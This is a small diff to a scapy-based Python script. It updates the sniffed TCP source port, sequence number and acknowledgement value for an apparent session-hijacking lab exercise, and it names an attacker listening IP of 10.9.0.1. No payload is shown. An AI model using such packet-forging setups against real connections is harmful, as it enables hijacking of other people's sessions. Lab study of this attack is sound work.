@@ -3,9 +3,9 @@ from scapy.all import *
 import sys
 
 # Fill with values found during analysis
-intSourcePort = 38658
-intNextSequenceNumber = 3373348256
-intAcknowledgementValue = 3021897517
+intSourcePort = 60864
+intNextSequenceNumber = 123282750
+intAcknowledgementValue = 4180309821
 
 # Attacker listening post
 strListeningIP = "10.9.0.1"
